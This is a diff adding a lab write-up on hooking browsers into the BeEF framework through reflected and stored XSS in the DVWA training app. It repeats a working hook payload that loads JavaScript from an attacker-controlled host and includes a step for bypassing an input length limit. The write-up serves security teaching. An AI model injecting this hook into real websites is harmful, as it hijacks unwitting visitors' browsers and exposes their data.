@@ -788,3 +788,201 @@ without using quotation marks inside the payload.
 
 
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+# Exercise: Hooking a Browser Using Stored and Reflected XSS with BeEF (DVWA)
+
+## Objective
+
+In this exercise, we demonstrated how a Cross-Site Scripting (XSS) vulnerability can be used to hook a victim's browser into the **Browser Exploitation Framework (BeEF)**. Rather than executing a simple `alert()` message, we injected the BeEF hook script into vulnerable pages so that any browser executing the payload becomes connected to the BeEF server.
+
+> **Note:** This exercise was performed in a controlled lab environment using DVWA for educational purposes.
+
+---
+
+# Step 1: Start the BeEF Framework
+
+On the Kali Linux machine, launch the BeEF Framework.
+
+```bash
+beef-xss
+```
+
+Once BeEF starts, open the web interface and log in using the default credentials.
+
+**Username**
+
+```text
+beef
+```
+
+**Password**
+
+```text
+beef
+```
+
+After logging in, the BeEF dashboard opens. Initially, no browsers are connected.
+
+<img width="1286" height="785" alt="Screenshot 2026-08-05 at 6 59 52 PM" src="https://github.com/user-attachments/assets/24610938-f20c-4c15-93da-8b32cc261286" />
+
+
+---
+
+# Step 2: Obtain the BeEF Hook Script
+
+BeEF provides a JavaScript hook that must execute inside the victim's browser.
+
+Example hook:
+
+```html
+<script src="http://172.16.219.133:3000/hook.js"></script>
+```
+
+> Replace the IP address with your own Kali Linux IP address.
+
+To identify your IP address, run:
+
+```bash
+ifconfig
+```
+
+Example output:
+
+```text
+172.16.219.133
+```
+
+The hook script becomes:
+
+```html
+<script src="http://172.16.219.133:3000/hook.js"></script>
+```
+
+
+---
+
+# Part 1 – Reflected XSS
+
+## Step 3: Open the Reflected XSS Page
+
+Navigate to:
+
+**DVWA → XSS (Reflected)**
+
+Set the security level to **Low**.
+
+Instead of the normal alert payload:
+
+```html
+<script>alert('XSS')</script>
+```
+
+inject the BeEF hook:
+
+```html
+<script src="http://172.16.219.133:3000/hook.js"></script>
+```
+
+The URL now contains the injected JavaScript.
+
+
+
+---
+
+## Step 4: Execute the Payload
+
+When the vulnerable URL is opened, the browser loads the BeEF hook.
+
+Returning to the BeEF dashboard, the browser now appears under **Online Browsers**.
+
+
+
+---
+
+# Part 2 – Stored XSS
+
+Stored XSS is more dangerous because the payload is permanently saved in the application. Any user who visits the vulnerable page automatically executes the JavaScript.
+
+---
+
+## Step 5: Open the Stored XSS Page
+
+Navigate to:
+
+**DVWA → XSS (Stored)**
+
+The Name field limits input length, so increase the maximum length using the browser's Developer Tools.
+
+Right-click the Name field → **Inspect**.
+
+Change:
+
+```html
+maxlength="10"
+```
+
+to
+
+```html
+maxlength="500"
+```
+
+<img width="1440" height="889" alt="Screenshot 2026-08-05 at 7 11 10 PM" src="https://github.com/user-attachments/assets/e60b47cf-0a22-4a6e-be7f-c800cf27f3c6" />
+
+
+---
+
+## Step 6: Inject the BeEF Hook
+
+Enter the following payload:
+
+```html
+<script src="http://172.16.219.133:3000/hook.js"></script>
+```
+
+Click **Sign Guestbook**.
+
+The payload is now stored inside the application's database.
+
+
+---
+
+## Step 7: Simulate a Victim Visiting the Page
+
+On another machine (Windows in our lab), open DVWA and navigate to:
+
+**XSS (Stored)**
+
+No suspicious URL or interaction is required. Simply loading the page causes the browser to execute the stored JavaScript.
+
+
+---
+
+## Step 8: Verify the Browser is Hooked
+
+Return to the BeEF dashboard.
+
+The Windows browser now appears under **Online Browsers**, confirming that the JavaScript hook executed successfully.
+
+The BeEF console also displays information such as:
+
+* Browser type
+* Operating system
+* IP address
+* Online status
+
+<img width="1440" height="848" alt="Screenshot 2026-08-05 at 7 11 57 PM" src="https://github.com/user-attachments/assets/85ca1137-c45a-4c2f-bef1-ba0755abff7c" />
+
+
+---
+
+# Key Takeaways
+
+* BeEF uses a small JavaScript hook to establish communication with a victim's browser.
+* Reflected XSS requires the victim to open a specially crafted URL containing the payload.
+* Stored XSS is more dangerous because the payload remains stored on the server and executes automatically whenever users visit the vulnerable page.
+* After a browser is hooked, BeEF can interact with the browser through its available modules, depending on browser capabilities and security settings.
+* Trusted or high-traffic websites with Stored XSS vulnerabilities present a greater risk because many users may unknowingly execute the malicious JavaScript.
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+
